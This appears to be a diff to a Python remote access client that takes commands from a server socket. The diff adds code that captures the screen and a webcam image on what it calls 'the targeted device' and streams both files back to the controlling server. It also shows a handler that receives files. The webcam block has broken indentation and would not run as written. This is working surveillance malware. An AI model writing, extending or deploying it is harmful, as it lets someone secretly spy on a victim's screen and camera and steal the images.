@@ -2,7 +2,7 @@ import socket
 import webbrowser as wb
 import os
 import subprocess
-import time   # 🔥 add
+import time
 from plyer import notification
 import pyttsx3
 import cv2
@@ -108,35 +108,8 @@ while True:
             send_to_server(f"alert showed")   # 🔥 add this
         except:
             send_to_server("can't show the alert")
-        
-    elif data.lower() == "cap_screen":
-        try:
-            screenshot = pyautogui.screenshot()
-            screenshot.save("shot.png")
-
-            send_to_server("Screenshot saved as shot.png")
-        
-        except:
-            send_to_server("Error While Capturing Screen Shot")
-        
-    elif data.lower() == "cap_web":
-        try:
-            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-            time.sleep(2)
-            ret, frame = cam.read()
-            if ret:
-                cv2.imwrite("selfie.png", frame)
-                send_to_server("Selfie saved as selfie.png")
-            else:
-                send_to_server("Failed to capture selfie")
-            cam.release()
-        
-        except:
-            send_to_server("Failed to capture selfie")
-
-
     
-    elif data.lower() == "all open":
+    elif data.lower() == "all app open":
         apps = [
             "excel","winword","powerpnt","outlook",
             "chrome","firefox","msedge",
@@ -151,8 +124,80 @@ while True:
                 send_to_server(f"{app} opened")
             except:
                 send_to_server(f"{app} not found")
-    
-    if data.startswith("FILE "):
+
+
+
+        
+    elif data.lower() == "cap_screen":
+        try:
+            filename = "shot.png"
+
+            screenshot = pyautogui.screenshot()
+            screenshot.save(filename)
+
+            filesize = os.path.getsize(filename)
+
+            client.send(f"SCREEN {filename} {filesize}".encode())
+
+            time.sleep(1)
+
+            with open(filename, "rb") as f:
+                while True:
+                    chunk = f.read(1024)
+
+                    if not chunk:
+                        break
+
+                    client.send(chunk)
+
+            send_to_server("Screenshot sent successfully!")
+
+        except Exception as e:
+            send_to_server(f"Screenshot error: {e}")
+        
+
+
+
+
+
+
+    elif data.lower() == "cap_web":
+        try:
+            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+            time.sleep(2)
+            ret, frame = cam.read()
+            if ret:
+                cv2.imwrite("selfie.png", frame)
+                send_to_server("Selfie saved as selfie.png")
+            else:
+                send_to_server("Failed to capture selfie. It can be for the targeted device doesn't have any web cam installed in his Machine")
+            cam.release()
+                imgname = "selfie.png"
+                imgsize = os.path.getsize(imgname)
+                client.send(f"SELFIE {imgname} {imgsize}".encode())
+
+            time.sleep(1)
+
+            with open(imgname, "rb") as f:
+                while True:
+                    chunk = f.read(1024)
+
+                    if not chunk:
+                        break
+
+                    client.send(chunk)
+            send_to_server("Screenshot sent successfully!")
+            
+        
+        except:
+            send_to_server("Failed to capture selfie. It can be for the targeted device doesn't have any web cam installed in his Machine")
+
+
+
+
+
+
+    elif data.startswith("FILE "):
         try:
             parts = data.split()
             filename = parts[1]
@@ -173,6 +218,12 @@ while True:
 
         except Exception as e:
             send_to_server("file receive failed")
+
+
+
+
+
+
 
     else:
         try:
